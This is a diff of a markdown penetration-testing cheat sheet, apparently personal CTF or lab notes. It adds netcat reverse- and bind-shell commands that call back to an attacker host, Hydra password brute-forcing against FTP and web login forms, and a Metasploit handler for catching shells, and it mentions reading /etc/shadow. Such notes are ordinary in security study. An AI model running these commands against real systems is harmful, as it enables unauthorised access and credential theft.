@@ -4,7 +4,7 @@
 
 * https://www.exploit-db.com/exploits/20745
 * words `sudo apt install seclists`
-https://github.com/security-cheatsheet/metasploit-cheat-sheet 
+
 
 
 
@@ -37,8 +37,8 @@ https://github.com/security-cheatsheet/metasploit-cheat-sheet
   * listing users `/etc/passwd`
   * listing passowrd `/etc/shadow` 
   
-  ### Nmap
-
+### Nmap
+* ` nmap -sU --top-ports 20 10.1.1.1` 
 
 # Fast Tool 
 ## Netcat
@@ -46,10 +46,16 @@ https://github.com/security-cheatsheet/metasploit-cheat-sheet
 * nc -lvp [listening port], `nc -lvp 4444`
 
 ## Hydra 
+* install `apt install hydra` 
 * used to brute force Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB
 * hydra -t 4 -l username -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+* web `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
 
-
+## Metasploit 
+* https://github.com/security-cheatsheet/metasploit-cheat-sheet
+* Run `msfconsole`
+* Multi/Handler is a superb tool for catching reverse shells ` use multi/handler`
+* `sessions 1 ` 
 
 ## Webserver 
 ### Python code 
@@ -112,6 +118,18 @@ https://github.com/security-cheatsheet/metasploit-cheat-sheet
 * ` mysql -h [IP] -u [username] -p` 
 
 # Shells 
+*  Reverse Shell Generator https://www.revshells.com/
+*  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+*
+## Reverse shell 
+* Target `nc <LOCAL-IP> <PORT> -e /bin/bash`
+* Host ` sudo nc -lvnp 443` 
+
+## Bind shell 
+* Target `nc -lvnp <port> -e "cmd.exe" `
+* Host `nc MACHINE_IP <port> ` 
+
+
 ## Simple Shell msfvenom 
 
 * using telnet 
